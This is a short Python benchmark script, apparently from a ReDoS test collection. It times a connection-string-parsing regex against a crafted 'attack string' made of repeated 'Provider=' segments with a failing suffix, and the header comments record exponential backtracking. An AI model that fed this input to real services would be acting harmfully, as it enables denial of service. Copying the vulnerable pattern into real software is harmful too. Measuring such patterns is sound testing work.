# 3422
# (?:Provider="??(?<Provider>[^;\n]+)"??[;\n"]??|Data\sSource=(?<DataSource>[^;\n]+)[;\n"]??|Initial\sCatalog=(?<InitialCatalog>[^;\n]+)[;\n"]??|User\sID=(?<UserID>[^;\n]+)[;\n"]??|Password="??(?<Password>[^;\n]+)"??[;\n"]??|Integrated\sSecurity=(?<IntegratedSecurity>[^;\n]+)[;\n]??|Connection\sTimeOut=(?<ConnectionTimeOut>[^;\n]+)[;\n"]??)+$
# EXPONENT
# nums:5
# EXPONENT AttackString:""+"Provider=" ";"*16+"! _1SLQ_1"

import re2 as re
from time import perf_counter

regex = """(?:Provider="??(?<Provider>[^;\n]+)"??[;\n"]??|Data\sSource=(?<DataSource>[^;\n]+)[;\n"]??|Initial\sCatalog=(?<InitialCatalog>[^;\n]+)[;\n"]??|User\sID=(?<UserID>[^;\n]+)[;\n"]??|Password="??(?<Password>[^;\n]+)"??[;\n"]??|Integrated\sSecurity=(?<IntegratedSecurity>[^;\n]+)[;\n]??|Connection\sTimeOut=(?<ConnectionTimeOut>[^;\n]+)[;\n"]??)+$"""
REGEX = re.compile(regex)
for i in range(0, 150000):
    ATTACK = "" + "Provider=\" \";" * i * 1 + "! _1SLQ_1"
    LEN = len(ATTACK)
    BEGIN = perf_counter()
    m = REGEX.search(ATTACK)
    # m = REGEX.match(ATTACK)
    DURATION = perf_counter() - BEGIN
    print(f"{i *1}: took {DURATION} seconds!")